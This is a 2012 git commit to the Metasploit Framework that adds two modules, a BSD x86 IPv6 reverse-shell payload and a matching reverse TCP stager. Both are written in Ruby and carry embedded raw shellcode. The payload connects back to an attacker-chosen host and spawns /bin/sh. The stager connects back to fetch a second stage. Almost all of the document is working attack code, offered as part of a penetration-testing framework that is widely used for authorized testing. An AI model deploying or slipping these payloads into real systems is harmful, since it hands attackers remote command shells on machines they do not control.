45a785fde0d5e0a5a62640cb330e80e4ebef8a47
HD Moore <hd_moore@rapid7.com>
2012-02-01 00:53:09 -0600

    Adds BSD IPv6 payloads and stagers

---
+++ modules/payloads/singles/bsd/x86/shell_reverse_tcp_ipv6.rb
@@ -0,0 +1,57 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+require 'msf/core/handler/reverse_tcp'
+require 'msf/base/sessions/command_shell'
+require 'msf/base/sessions/command_shell_options'
+
+module Metasploit3
+
+	include Msf::Payload::Single
+	include Msf::Payload::Bsd
+	include Msf::Sessions::CommandShellOptions
+
+	def initialize(info = {})
+		super(merge_info(info,
+			'Name'          => 'BSD Command Shell, Reverse TCP Inline (IPv6)',
+			'Version'       => '$Revision$',
+			'Description'   => 'Connect back to attacker and spawn a command shell over IPv6',
+			'Author'        => [ 'skape', 'vlad902', 'hdm' ],
+			'License'       => MSF_LICENSE,
+			'Platform'      => 'bsd',
+			'Arch'          => ARCH_X86,
+			'Handler'       => Msf::Handler::ReverseTcp,
+			'Session'       => Msf::Sessions::CommandShellUnix,
+			'Payload'       =>
+				{
+					'Offsets' =>
+						{
+							'LHOST'    => [ 43, 'ADDR' ],
+							'LPORT'    => [ 36, 'n'    ],
+							'SCOPEID'  => [ 59, 'V'    ]
+						},
+					'Payload' =>
+						"\x31\xc0\x50\x40\x50\x6a\x1c\x6a\x61\x58\x50\xcd\x80\xeb\x0e\x59" +
+						"\x6a\x1c\x51\x50\x97\x6a\x62\x58\x50\xcd\x80\xeb\x21\xe8\xed\xff" + 
+						"\xff\xff\x1c\x1c\xbf\xbf\x00\x00\x00\x00\x40\x41\x42\x43\x45\x46" + 
+						"\x47\x48\x49\x4a\x4b\x4d\x4e\x4f\x50\x51\x00\x00\x00\x00\x6a\x02" + 
+						"\x59\xb0\x5a\x51\x57\x51\xcd\x80\x49\x79\xf6\x50\x68\x2f\x2f\x73" +
+						"\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x53\xb0\x3b\xcd\x80" 
+
+				}
+		))
+		register_options([
+			OptInt.new('SCOPEID', [false, "IPv6 scope ID, for link-local addresses", 0])
+		])		
+	end
+
+end
---
+++ modules/payloads/stagers/bsd/x86/reverse_ipv6_tcp.rb
@@ -0,0 +1,65 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+
+require 'msf/core'
+require 'msf/core/handler/reverse_tcp'
+
+
+###
+#
+# ReverseTcp
+# ----------
+#
+# BSD reverse TCP stager.
+#
+###
+module Metasploit3
+
+	include Msf::Payload::Stager
+
+
+	def self.handler_type_alias
+		"reverse_ipv6_tcp"
+	end
+
+	def initialize(info = {})
+		super(merge_info(info,
+			'Name'          => 'Reverse TCP Stager (IPv6)',
+			'Version'       => '$Revision$',
+			'Description'   => 'Connect back to the attacker over IPv6',
+			'Author'        =>  ['skape', 'vlad902', 'hdm'],
+			'License'       => MSF_LICENSE,
+			'Platform'      => 'bsd',
+			'Arch'          => ARCH_X86,
+			'Handler'       => Msf::Handler::ReverseTcp,
+			'Stager'        =>
+				{
+					'Offsets' =>
+						{
+							'LHOST'    => [ 43, 'ADDR' ],
+							'LPORT'    => [ 36, 'n'    ],
+							'SCOPEID'  => [ 59, 'V'    ]
+						},
+					'Payload' =>
+						"\x31\xc0\x50\x40\x50\x6a\x1c\x6a\x61\x58\x50\xcd\x80\xeb\x0e\x59" +
+						"\x6a\x1c\x51\x50\x97\x6a\x62\x58\x50\xcd\x80\xeb\x21\xe8\xed\xff" +
+						"\xff\xff\x1c\x1c\xbf\xbf\x00\x00\x00\x00\x40\x41\x42\x43\x45\x46" +
+						"\x47\x48\x49\x4a\x4b\x4d\x4e\x4f\x50\x51\x00\x00\x00\x00\xb0\x03" +
+						"\xc6\x41\xfd\x10\xcd\x80\xc3"
+				}
+			))
+		register_options([
+			OptInt.new('SCOPEID', [false, "IPv6 scope ID, for link-local addresses", 0])
+		])				
+	end
+
+end
